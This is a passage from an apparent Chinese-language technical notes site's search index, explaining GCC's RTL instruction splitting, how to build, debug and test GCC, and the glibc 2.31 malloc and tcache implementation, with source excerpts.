[77])\n  x3 = XEXP (x2, 0);\n  // operands[1] = (reg:SI 10 a0 [77])\n  operands[1] = x3;\n  if (!register_operand (operands[1], E_SImode))\n    return -1;\n  // x4 = (reg:SI 11 a1 [78])\n  x4 = XEXP (x2, 1);\n  // operands[2] = (reg:SI 11 a1 [78])\n  operands[2] = x4;\n  if (!register_operand (operands[2], i1))\n    return -1;\n  return 0;\n}\n</code></pre> <p>\u200b\u4ee3\u7801\u200b\u4e2d\u200b\u7528\u200b\u6ce8\u91ca\u200b\u6807\u6ce8\u200b\u4e86\u200b\u6bcf\u200b\u4e00\u6b65\u200b\u5339\u914d\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u53ef\u89c1\u200b\u4ee3\u7801\u200b\u5728\u200b\u5339\u914d\u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u628a\u200b\u64cd\u4f5c\u6570\u200b\u4fdd\u5b58\u200b\u4e86\u200b\u4e0b\u6765\u200b\u3002</p>"},{"location":"software/gcc.html#_4","title":"\u6307\u4ee4\u200b\u62c6\u5206","text":"<p>\u200b\u6709\u4e9b\u200b\u65f6\u5019\u200b\uff0cRTL \u200b\u5c42\u6b21\u200b\u4e0a\u200b\u7684\u200b\u6307\u4ee4\u200b\u53ef\u80fd\u200b\u5bf9\u5e94\u200b\u591a\u6761\u200b\u5b9e\u9645\u200b\u7684\u200b\u673a\u5668\u6307\u4ee4\u200b\u3002\u200b\u4f8b\u5982\u200b\u5728\u200b 32 \u200b\u4f4d\u200b target \u200b\u4e0a\u200b\uff0c\u200b\u62f7\u8d1d\u200b\u4e00\u4e2a\u200b 64 \u200b\u4f4d\u200b\u6574\u6570\u200b\uff0c\u200b\u8fd9\u200b\u610f\u5473\u7740\u200b\u9700\u8981\u200b\u628a\u200b\u4e00\u4e2a\u200b DI \u200b\u7c7b\u578b\u200b\u7684\u200b move\uff0c\u200b\u62c6\u6210\u200b\u4e24\u4e2a\u200b SI \u200b\u7c7b\u578b\u200b\u7684\u200b move\uff0c\u200b\u5206\u522b\u200b\u5904\u7406\u200b\u9ad8\u4f4d\u200b\u548c\u200b\u4f4e\u4f4d\u200b\u3002\u200b\u4e0b\u9762\u200b\u6765\u770b\u200b\u4e00\u4e2a\u200b rv32 \u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1a</p> <pre><code>;; 64-bit modes for which we provide move patterns.\n(define_mode_iterator MOVE64 [DI DF])\n\n(define_split\n  [(set (match_operand:MOVE64 0 \"nonimmediate_operand\")\n    (match_operand:MOVE64 1 \"move_operand\"))]\n  \"reload_completed\n   &amp;&amp; riscv_split_64bit_move_p (operands[0], operands[1])\"\n  [(const_int 0)]\n{\n  riscv_split_doubleword_move (operands[0], operands[1]);\n  DONE;\n})\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u5b83\u4f1a\u200b\u5c1d\u8bd5\u200b\u5339\u914d\u200b\u4ece\u200b\u4e00\u4e2a\u200b 64 \u200b\u4f4d\u200b\u6574\u6570\u200b\uff08DI\uff09\u200b\u6216\u200b\u6d6e\u70b9\u6570\u200b\uff08DF\uff09\u200b\u5230\u200b\u53e6\u200b\u4e00\u4e2a\u200b 64 \u200b\u4f4d\u200b\u6574\u6570\u200b\uff08DI\uff09\u200b\u6216\u200b\u6d6e\u70b9\u6570\u200b\uff08DF\uff09\u200b\u7684\u200b set\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b move \u200b\u64cd\u4f5c\u200b\u3002\u200b\u5339\u914d\u200b\u4e0a\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5224\u65ad\u200b\u6761\u4ef6\u200b\uff1a</p> <pre><code>  \"reload_completed\n   &amp;&amp; riscv_split_64bit_move_p (operands[0], operands[1])\"\n</code></pre> <p>\u200b\u662f\u5426\u200b\u6210\u7acb\u200b\u3002\u200b\u8fd9\u91cc\u200b <code>reload_completed == true</code> \u200b\u8868\u793a\u200b\u5df2\u7ecf\u200b\u5b8c\u6210\u200b\u5bc4\u5b58\u5668\u200b\u5206\u914d\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u6210\u7acb\u200b\uff0c\u200b\u5c31\u200b\u8ba4\u4e3a\u200b\u53ef\u4ee5\u200b\u62c6\u5206\u200b 64 \u200b\u4f4d\u200b\u7684\u200b move \u200b\u4e3a\u200b\u4e24\u4e2a\u200b 32 \u200b\u4f4d\u200b\u7684\u200b move\uff0c\u200b\u5c31\u200b\u751f\u6210\u200b\u4e0b\u5217\u200b RTL\uff1a</p> <pre><code>  [(const_int 0)]\n</code></pre> <p>\u200b\u4f46\u662f\u200b\u5b9e\u9645\u4e0a\u200b\u4e0d\u4f1a\u200b\u751f\u6210\u200b\u8fd9\u4e2a\u200b\uff0c\u200b\u800c\u662f\u200b\u8c03\u7528\u200b\u540e\u9762\u200b\u7684\u200b\u4ee3\u7801\u200b\u6765\u200b\u751f\u6210\u200b\u65b0\u200b\u7684\u200b RTL \u200b\u4ee3\u7801\u200b\uff1a</p> <pre><code>{\n  riscv_split_doubleword_move (operands[0], operands[1]);\n  DONE;\n})\n</code></pre> <p>\u200b\u5b8c\u6574\u200b\u7684\u200b <code>define_split</code> \u200b\u5b9a\u4e49\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>(define-split\n  [insn-pattern]\n  \"condition\"\n  [new-insn-pattern-1\n   new-insn-pattern-2\n   ...]\n  \"preparation-statements\")\n</code></pre> <p>\u200b\u5ffd\u7565\u200b\u4e86\u200b\u53ef\u9009\u200b\u7684\u200b\u547d\u540d\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u6765\u770b\u200b\u4e00\u4e2a\u200b\u5177\u4f53\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u8fd9\u200b\u4e00\u6bb5\u200b\u662f\u200b\u5728\u200b split \u200b\u4e4b\u524d\u200b\u7684\u200b RTL \u200b\u4ee3\u7801\u200b\uff1a</p> <pre><code>(insn 6 3 13 (set (reg:DI 14 a4 [orig:72 _2 ] [72])\n        (mem/c:DI (plus:SI (reg/f:SI 8 s0)\n                (const_int -24 [0xffffffffffffffe8])) [1 a+0 S8 A64])) \"kb.c\":1:38 134 {*movdi_32bit}\n     (nil))\n</code></pre> <p>\u200b\u5b83\u200b\u505a\u200b\u7684\u200b\u4e8b\u60c5\u200b\u662f\u200b\uff0c\u200b\u4ece\u200b\u5185\u5b58\u5730\u5740\u200b <code>$s0-24</code> \u200b\u8bfb\u53d6\u200b\u8bfb\u53d6\u200b 8 \u200b\u4e2a\u200b\u5b57\u8282\u200b\uff0c\u200b\u5199\u5165\u200b\u5230\u200b a4 \u200b\u5bc4\u5b58\u5668\u200b\u5f53\u4e2d\u200b\uff0c\u200b\u7531\u4e8e\u200b RV32 \u200b\u5bc4\u5b58\u5668\u200b\u5bbd\u5ea6\u200b\u53ea\u6709\u200b 32 \u200b\u4f4d\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u62c6\u6210\u200b\u4e24\u4e2a\u200b\u8bfb\u53d6\u200b\uff1a</p> <pre><code>Splitting with gen_split_14 (riscv.md:1510)\ndeleting insn with uid = 6.\ndeleting insn with uid = 6.\n\n(insn 30 3 31 (set (reg:SI 14 a4 [orig:72 _2 ] [72])\n        (mem/c:SI (plus:SI (reg/f:SI 8 s0)\n                (const_int -24 [0xffffffffffffffe8])) [1 a+0 S4 A64])) \"kb.c\":1:38 136 {*movsi_internal}\n     (nil))\n(insn 31 30 32 (set (reg:SI 15 a5 [ _2+4 ])\n        (mem/c:SI (plus:SI (reg/f:SI 8 s0)\n                (const_int -20 [0xffffffffffffffec])) [1 a+4 S4 A32])) \"kb.c\":1:38 136 {*movsi_internal}\n     (nil))\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c64 \u200b\u4f4d\u200b\u7684\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b\u88ab\u200b\u62c6\u6210\u200b\u4e86\u200b\u4e24\u4e2a\u200b 32 \u200b\u4f4d\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u5206\u522b\u200b\u662f\u200b a4 \u200b\u548c\u200b a5\uff1b\u200b\u5185\u5b58\u200b\u8bfb\u53d6\u200b\u6307\u4ee4\u200b\u4e5f\u200b\u62c6\u200b\u5206\u6210\u200b\u4e86\u200b\u4e24\u4e2a\u200b SI \u200b\u7c7b\u578b\u200b\u7684\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u6808\u4e0a\u200b\u7684\u200b\u504f\u79fb\u200b\u4e5f\u200b\u505a\u200b\u4e86\u200b\u76f8\u5e94\u200b\u7684\u200b\u8c03\u6574\u200b\u3002</p> <p>\u200b\u6709\u65f6\u5019\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u89c1\u5230\u200b <code>define_insn_and_split</code>\uff1a</p> <pre><code>(define_insn_and_split\n  [insn-pattern]\n  \"condition\"\n  \"output-template\"\n  \"split-condition\"\n  [new-insn-pattern-1\n   new-insn-pattern-2\n   ...]\n  \"preparation-statements\"\n  [insn-attribute])\n</code></pre> <p>\u200b\u8fd9\u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b <code>define_insn</code> \u200b\u52a0\u200b\u4e00\u4e2a\u200b <code>define_split</code>\uff0c\u200b\u4e8c\u8005\u200b\u7684\u200b <code>insn-pattern</code> \u200b\u4e00\u81f4\u200b\uff1a</p> <pre><code>(define_insn\n  [insn-pattern]\n  \"condition\"\n  \"output-template\"\n  [insn-attribute])\n\n(define_split\n  [insn-pattern]\n  \"split-condition\"\n  [new-insn-pattern-1\n   new-insn-pattern-2\n   ...]\n  \"preparation-statements\")\n</code></pre>"},{"location":"software/gcc.html#gcc","title":"\u6784\u5efa\u200b\u7528\u4e8e\u200b\u5f00\u53d1\u200b\u7684\u200b GCC","text":"<p>\u200b\u5b8c\u6574\u200b\u7684\u200b GCC \u200b\u9700\u8981\u200b\u7ecf\u8fc7\u200b bootstrap\uff0c\u200b\u4f46\u662f\u200b\u4e3a\u4e86\u200b\u5f00\u53d1\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7b80\u5316\u200b\uff1a</p> <pre><code>mkdir gcc-build\ncd gcc-build\n../gcc/configure --prefix=$PREFIX --enable-languages=c,c++ --disable-bootstrap CFLAGS=\"-g -O0\" CXXFLAGS=\"-g -O0\"\nmake -j8\nmake install -j8\n</code></pre> <p>\u200b\u4ea4\u53c9\u200b\u7f16\u8bd1\u200b\uff1a\u200b\u7ed9\u200b configure \u200b\u6dfb\u52a0\u200b\u53c2\u6570\u200b <code>--target=loongarch64-unknown-linux-gnu</code>\uff0c\u200b\u4f46\u662f\u200b\u6709\u200b\u4e00\u4e9b\u200b\u7ec4\u4ef6\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u56e0\u4e3a\u200b\u7f3a\u5c11\u200b\u4ea4\u53c9\u200b\u7f16\u8bd1\u200b\u73af\u5883\u200b\u800c\u200b\u65e0\u6cd5\u200b\u7f16\u8bd1\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53ea\u200b\u7f16\u8bd1\u200b\u548c\u200b\u5b89\u88c5\u200b gcc\uff1a<code>make all-gcc &amp;&amp; make install-gcc</code>\u3002</p> <p>\u200b\u4ea4\u53c9\u200b\u7f16\u8bd1\u200b\u65f6\u200b\uff0c\u200b\u7531\u4e8e\u200b libgcc \u200b\u4f1a\u200b\u4f9d\u8d56\u200b libc\uff0c\u200b\u4f46\u200b\u6784\u5efa\u200b libc \u200b\u53c8\u200b\u9700\u8981\u200b\u8fde\u63a5\u200b libgcc\uff0c\u200b\u6240\u4ee5\u200b\u5b9e\u9645\u200b\u7684\u200b\u6784\u5efa\u200b\u987a\u5e8f\u200b\u662f\u200b\u8fd9\u6837\u200b\u7684\u200b\uff1a</p> <ol> <li>\u200b\u6784\u5efa\u200b binutils</li> <li>\u200b\u6784\u5efa\u200b\u4e00\u4e2a\u200b\u4e0d\u200b\u4f9d\u8d56\u200b libc \u200b\u7684\u200b gcc+libgcc\uff0c\u200b\u7f16\u8bd1\u200b\u7684\u200b\u65f6\u5019\u200b\u8bbe\u7f6e\u200b\uff1a<ol> <li>--without-headers\uff1a\u200b\u6ca1\u6709\u200b C \u200b\u5934\u6587\u4ef6\u200b</li> <li>--disable-threads\uff1a\u200b\u6ca1\u6709\u200b pthread</li> <li>--disable-shared\uff1a\u200b\u52a8\u6001\u200b\u94fe\u63a5\u200b\u4f9d\u8d56\u200b libc</li> </ol> </li> <li>\u200b\u6784\u5efa\u200b libc\uff0c\u200b\u5982\u679c\u200b libc \u200b\u9700\u8981\u200b linux \u200b\u5934\u6587\u4ef6\u200b\uff0c\u200b\u5219\u200b\u8fd8\u200b\u9700\u8981\u200b\u5728\u200b linux \u200b\u6e90\u7801\u200b\u4e2d\u200b\u8fdb\u884c\u200b headers_install</li> <li>\u200b\u518d\u200b\u6784\u5efa\u200b\u4e00\u4e2a\u200b\u4f9d\u8d56\u200b libc \u200b\u7684\u200b gcc+libgcc</li> </ol> <p>\u200b\u8fd8\u6709\u200b\u4e00\u79cd\u200b\u529e\u6cd5\u200b\uff0c\u200b\u662f\u200b\u7528\u200b newlib \u200b\u6765\u200b\u505a\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b\u7a7a\u58f3\u200b libc \u200b\u5b9e\u73b0\u200b\uff0c\u200b\u8fd9\u6837\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4e00\u6b65\u5230\u4f4d\u200b\u3002</p>"},{"location":"software/gcc.html#gcc_1","title":"\u8c03\u8bd5\u200b GCC","text":"<p>\u200b\u7ed9\u200b GCC \u200b\u4f20\u9012\u200b\u7f16\u8bd1\u200b\u9009\u9879\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba9\u200b GCC \u200b\u6253\u5370\u200b\u4e2d\u95f4\u200b\u7ed3\u679c\u200b\uff0c\u200b\u89c1\u200b GCC Developer Options\uff1a<code>-fdump-tree-all -fdump-rtl-all -dP</code>\u3002\u200b\u60f3\u8981\u200b\u66f4\u52a0\u200b\u8be6\u7ec6\u200b\u7684\u200b\u65e5\u5fd7\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>-fdump-tree-all-details</code> \u200b\u751a\u81f3\u200b <code>-fdump-tree-all-all</code>\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u7ed9\u200b GCC \u200b\u6253\u65ad\u200b\u70b9\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6dfb\u52a0\u200b <code>-v</code> \u200b\u53c2\u6570\u200b\uff0c\u200b\u627e\u5230\u200b\u5b9e\u9645\u200b\u7684\u200b <code>cc1</code> \u200b\u547d\u4ee4\u884c\u200b\u8c03\u7528\u200b\uff0c\u200b\u518d\u7528\u200b\u8c03\u8bd5\u5668\u200b\u8c03\u8bd5\u200b cc1\u3002GCC \u200b\u63d0\u4f9b\u200b\u4e86\u200b gdbinit \u200b\u914d\u7f6e\u200b\uff1a<code>gcc/gdbinit.in</code>\u3002</p>"},{"location":"software/gcc.html#gcc_2","title":"\u6d4b\u8bd5\u200b GCC","text":"<p>\u200b\u53c2\u8003\u200b\uff1aInstalling GCC: Testing Working with the testsuite</p> <p>\u200b\u8fd0\u884c\u200b\u6240\u6709\u200b gcc \u200b\u6d4b\u8bd5\u200b\uff1a<code>make check-gcc</code>\u3002\u200b\u9488\u5bf9\u200b\u6d4b\u8bd5\u200b\u7c7b\u578b\u200b\u8fdb\u884c\u200b\u8fc7\u6ee4\u200b\uff1a</p> <pre><code># test according to all files named execute.exp\nmake check-gcc RUNTESTFLAGS=\"execute.exp\"\n# test according to all files named execute.exp\n# ./gcc/testsuite/g++.target/loongarch/loongarch.exp\n# ./gcc/testsuite/gcc.target/loongarch/loongarch.exp\nmake check-gcc RUNTESTFLAGS=\"loongarch.exp\"\n</code></pre> <p>\u200b\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u9650\u5236\u200b\u5230\u200b\u67d0\u4e2a\u200b\u6d4b\u4f8b\u200b\uff0c\u200b\u4f8b\u5982\u200b\u8981\u200b\u6d4b\u8bd5\u200b <code>gcc.target/loongarch/cas-acquire.c</code>\uff1a</p> <pre><code>make check-gcc RUNTESTFLAGS=\"loongarch.exp='cas-acquire.c'\"\n</code></pre>"},{"location":"software/glibc_allocator.html","title":"glibc \u200b\u5185\u5b58\u200b\u5206\u914d\u5668","text":""},{"location":"software/glibc_allocator.html#glibc-231","title":"glibc 2.31","text":"<p>glibc 2.31 \u200b\u662f\u200b ubuntu 20.04 \u200b\u6240\u200b\u4f7f\u7528\u200b\u7684\u200b libc \u200b\u7248\u672c\u200b\uff0c\u200b\u9996\u5148\u200b\u6765\u200b\u5206\u6790\u200b\u5b83\u200b\u7684\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u6e90\u7801\u200b\u53ef\u4ee5\u200b\u4ece\u200b glibc-2.31 tag \u200b\u4e2d\u200b\u627e\u5230\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u6765\u770b\u200b malloc \u200b\u51fd\u6570\u200b\uff0c\u200b\u5b83\u200b\u5b9e\u73b0\u200b\u5728\u200b <code>malloc/malloc.c</code> \u200b\u7684\u200b <code>__libc_malloc</code> \u200b\u51fd\u6570\u200b\u5f53\u4e2d\u200b\uff0c\u200b\u5ffd\u7565\u200b <code>__malloc_hook</code> \u200b\u548c\u200b\u4e00\u4e9b\u200b\u68c0\u67e5\u200b\uff0c\u200b\u9996\u5148\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5b83\u200b\u6709\u200b\u4e00\u6bb5\u200b\u4ee3\u7801\u200b\uff0c\u200b\u4f7f\u7528\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u53eb\u505a\u200b tcache \u200b\u7684\u200b\u6570\u636e\u7ed3\u6784\u200b\uff1a</p> <pre><code>/* int_free also calls request2size, be careful to not pad twice.  */\nsize_t tbytes;\nif (!checked_request2size (bytes, &amp;tbytes))\n  {\n    __set_errno (ENOMEM);\n    return NULL;\n  }\nsize_t tc_idx = csize2tidx (tbytes);\n\nMAYBE_INIT_TCACHE ();\n\nDIAG_PUSH_NEEDS_COMMENT;\nif (tc_idx &lt; mp_.tcache_bins\n    &amp;&amp; tcache\n    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; 0)\n  {\n    return tcache_get (tc_idx);\n  }\nDIAG_POP_NEEDS_COMMENT;\n</code></pre>"},{"location":"software/glibc_allocator.html#tcache-thread-local-cache","title":"tcache (Thread Local Cache)","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\u4ed4\u7ec6\u200b\u5730\u200b\u7814\u7a76\u200b tcache \u200b\u7684\u200b\u7ed3\u6784\u200b\u3002\u200b\u9996\u5148\u200b\uff0c\u200b\u5b83\u200b\u662f\u200b\u4e00\u4e2a\u200b per-thread \u200b\u7684\u200b\u6570\u636e\u7ed3\u6784\u200b\uff0c\u200b\u610f\u5473\u7740\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u90fd\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u4e00\u4efd\u200b tcache\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u4e0a\u9501\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8bbf\u95ee\u200b\uff1a</p> <pre><code>static __thread tcache_perthread_struct *tcache = NULL;\n</code></pre> <p>\u200b\u63a5\u4e0b\u6765\u200b\u770b\u200b\u5b83\u200b\u5177\u4f53\u200b\u4fdd\u5b58\u200b\u4e86\u200b\u4ec0\u4e48\u200b\uff1a</p> <pre><code>/* We overlay this structure on the user-data portion of a chunk when\n   the chunk is stored in the per-thread cache.  */\ntypedef struct tcache_entry\n{\n  struct tcache_entry *next;\n  /* This field exists to detect double frees.  */\n  struct tcache_perthread_struct *key;\n} tcache_entry;\n\n/* There is one of these for each thread, which contains the\n   per-thread cache (hence \"tcache_perthread_struct\").  Keeping\n   overall size low is mildly important.  Note that COUNTS and ENTRIES\n   are redundant (we could have just counted the linked list each\n   time), this is for performance reasons.  */\ntypedef struct tcache_perthread_struct\n{\n  uint16_t counts[TCACHE_MAX_BINS];\n  tcache_entry *entries[TCACHE_MAX_BINS];\n} tcache_perthread_struct;\n\n/* Caller must ensure that we know tc_idx is valid and there's room\n   for more chunks.  */\nstatic __always_inline void\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n\n  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n  e-&gt;key = tcache;\n\n  e-&gt;next = tcache-&gt;entries[tc_idx];\n  tcache-&gt;entries[tc_idx] = e;\n  ++(tcache-&gt;counts[tc_idx]);\n}\n\n/* Caller must ensure that we know tc_idx is valid and there's\n   available chunks to remove.  */\nstatic __always_inline void *\ntcache_get (size_t tc_idx)\n{\n  tcache_entry *e = tcache-&gt;entries[tc_idx];\n  tcache-&gt;entries[tc_idx] = e-&gt;next;\n  --(tcache-&gt;counts[tc_idx]);\n  e-&gt;key = NULL;\n  return (void *) e;\n}\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5b83\u200b\u6709\u200b\u4e24\u4e2a\u200b\u6210\u5458\u200b\uff0c\u200b\u628a\u200b tcache \u200b\u5206\u4e3a\u200b <code>TCACHE_MAX_BINS</code> \u200b\u8fd9\u4e48\u200b\u591a\u4e2a\u200b bin\uff0c\u200b\u6bcf\u4e2a\u200b bin \u200b\u5206\u522b\u200b\u6709\u200b\u4e00\u4e2a\u200b\uff1a</p> <ol> <li><code>counts[bin]</code>\uff1a\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u8fd9\u4e2a\u200b bin \u200b\u4e2d\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u6570\u91cf\u200b\uff0c<code>tcache_put</code> \u200b\u7684\u200b\u65f6\u5019\u200b\u52a0\u4e00\u200b\uff0c<code>tcache_get</code> \u200b\u7684\u200b\u65f6\u5019\u200b\u51cf\u4e00\u200b</li> <li><code>entries[bin]</code>: \u200b\u6bcf\u4e2a\u200b bin \u200b\u7528\u200b\u4e00\u4e2a\u200b\u94fe\u8868\u200b\u4fdd\u5b58\u200b\u4e86\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u94fe\u8868\u200b\u7684\u200b\u8282\u70b9\u200b\u7c7b\u578b\u200b\u662f\u200b <code>tcache_entry</code>\uff0c\u200b\u90a3\u4e48\u200b <code>entries[bin]</code> \u200b\u4fdd\u5b58\u200b\u4e86\u200b\u94fe\u8868\u200b\u5934\u200b\u7684\u200b\u6307\u9488\u200b</li> </ol> <p>bin \u200b\u662f\u200b\u5185\u5b58\u200b\u5206\u914d\u5668\u200b\u7684\u200b\u4e00\u4e2a\u200b\u5e38\u89c1\u200b\u505a\u6cd5\u200b\uff0c\u200b\u628a\u200b\u8981\u200b\u5206\u914d\u200b\u7684\u200b\u5757\u200b\u7684\u200b\u5927\u5c0f\u200b\u5206\u200b bin\uff0c\u200b\u4ece\u800c\u200b\u4fdd\u8bc1\u200b\u62ff\u5230\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u8db3\u591f\u200b\u5927\u200b\u3002\u200b\u63a5\u4e0b\u6765\u200b\u770b\u200b <code>tcache_put</code> \u200b\u662f\u200b\u5982\u4f55\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u653e\u5230\u200b tcache \u200b\u4e2d\u200b\u7684\u200b\uff1a</p> <ol> <li>\u200b\u628a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5f3a\u5236\u200b\u8f6c\u6362\u200b\u4e3a\u200b <code>tcache_entry</code> \u200b\u7ed3\u6784\u200b\u4f53\u200b\u7c7b\u578b\u200b</li> <li>\u200b\u628a\u200b\u5b83\u200b\u7684\u200b <code>key</code> \u200b\u5b57\u200b\u6bb5\u200b\u6307\u5411\u200b tcache\uff0c\u200b\u7528\u6765\u200b\u8868\u793a\u200b\u8fd9\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5f53\u524d\u200b\u5728\u200b <code>tcache</code> \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u540e\u7eed\u200b\u7528\u200b\u5b83\u200b\u6765\u200b\u68c0\u6d4b\u200b double free</li> <li>\u200b\u4ee5\u65b0\u200b\u7684\u200b <code>tcache_entry</code> \u200b\u4f5c\u4e3a\u200b\u94fe\u8868\u200b\u5934\u200b\uff0c\u200b\u63d2\u5165\u200b\u5230\u200b tcache \u200b\u7684\u200b\u5bf9\u5e94\u200b\u7684\u200b bin \u200b\u5f53\u4e2d\u200b\uff1a<code>entries[tc_idx]</code></li> <li>\u200b\u66f4\u65b0\u200b\u8fd9\u4e2a\u200b bin \u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4e2a\u6570\u200b\u5230\u200b <code>count[tc_idx]</code> \u200b\u5f53\u4e2d\u200b</li> </ol> <p>\u200b\u53cd\u8fc7\u6765\u200b\uff0c<code>tcache_get</code> \u200b\u5219\u200b\u662f\u4ece\u200b tcache \u200b\u4e2d\u200b\u62ff\u51fa\u200b\u4e00\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff1a</p> <ol> <li>\u200b\u4ece\u200b\u94fe\u8868\u200b\u5934\u200b <code>entries[tc_idx]</code> \u200b\u53d6\u51fa\u200b\u4e00\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u628a\u200b\u5b83\u200b\u4ece\u200b\u94fe\u8868\u200b\u4e2d\u200b\u5220\u9664\u200b\uff1a<code>entries[tc_idx] = e-&gt;next</code></li> <li>\u200b\u66f4\u65b0\u200b\u8fd9\u4e2a\u200b bin \u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4e2a\u6570\u200b\u5230\u200b <code>count[tc_idx]</code> \u200b\u5f53\u4e2d\u200b</li> <li>\u200b\u628a\u200b\u5b83\u200b\u7684\u200b <code>key</code> \u200b\u5b57\u200b\u6bb5\u200b\u6307\u5411\u200b NULL\uff0c\u200b\u7528\u6765\u200b\u8868\u793a\u200b\u8fd9\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5f53\u524d\u200b\u4e0d\u200b\u5728\u200b <code>tcache</code> \u200b\u5f53\u4e2d\u200b</li> <li>\u200b\u8fd4\u56de\u200b\u8fd9\u4e2a\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b\u5730\u5740\u200b</li> </ol>"},{"location":"software/glibc_allocator.html#malloc","title":"malloc","text":"<p>\u200b\u63a5\u4e0b\u6765\u200b\u56de\u5230\u200b <code>malloc</code> \u200b\u7684\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u5b83\u200b\u9996\u5148\u200b\u6839\u636e\u200b\u7528\u6237\u200b\u8981\u200b\u5206\u914d\u200b\u7684\u200b\u7a7a\u95f4\u200b\u5927\u5c0f\u200b\uff08<code>bytes</code>\uff09\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u200b\u5b9e\u9645\u200b\u9700\u8981\u200b\u5206\u914d\u200b\u7684\u200b\u5927\u5c0f\u200b\uff08<code>tbytes</code>\uff09\uff0c\u200b\u548c\u200b\u5bf9\u5e94\u200b\u7684\u200b bin\uff08<code>tc_idx</code>\uff09\uff1a</p> <pre><code>/* int_free also calls request2size, be careful to not pad twice.  */\nsize_t tbytes;\nif (!checked_request2size (bytes, &amp;tbytes))\n  {\n    __set_errno (ENOMEM);\n    return NULL;\n  }\nsize_t tc_idx = csize2tidx (tbytes);\n</code></pre> <p>\u200b\u5176\u4e2d\u200b <code>checked_request2size</code> \u200b\u5b9e\u73b0\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>#define request2size(req)                                         \\\n  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \\\n   MINSIZE :                                                      \\\n   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)\n\n/* Check if REQ overflows when padded and aligned and if the resulting value\n   is less than PTRDIFF_T.  Returns TRUE and the requested size or MINSIZE in\n   case the value is less than MINSIZE on SZ or false if any of the previous\n   check fail.  */\nstatic inline bool\nchecked_request2size (size_t req, size_t *sz) __nonnull (1)\n{\n  if (__glibc_unlikely (req &gt; PTRDIFF_MAX))\n    return false;\n  *sz = request2size (req);\n  return true;\n}\n</code></pre> <p>\u200b\u5b83\u200b\u5b9e\u73b0\u200b\u7684\u200b\u5b9e\u9645\u4e0a\u200b\u662f\u200b\u628a\u200b\u7528\u6237\u200b\u8bf7\u6c42\u200b\u7684\u200b\u5185\u5b58\u5927\u5c0f\u200b\uff0c\u200b\u52a0\u4e0a\u200b <code>SIZE_SZ</code>\uff08\u200b\u5373\u200b <code>sizeof(size_t)</code>\uff09\uff0c\u200b\u5411\u4e0a\u200b\u53d6\u6574\u200b\u5230\u200b <code>MALLOC_ALIGN_MASK</code> \u200b\u5bf9\u5e94\u200b\u7684\u200b alignment\uff08<code>MALLOC_ALIGNMENT</code>\uff0c\u200b\u901a\u5e38\u200b\u662f\u200b <code>2 * SIZE_SZ</code>\uff09\u200b\u7684\u200b\u6574\u6570\u200b\u500d\u6570\u200b\uff0c\u200b\u518d\u200b\u548c\u200b <code>MINSIZE</code> \u200b\u53d6\u200b max\u3002\u200b\u8fd9\u91cc\u200b\u8981\u52a0\u200b 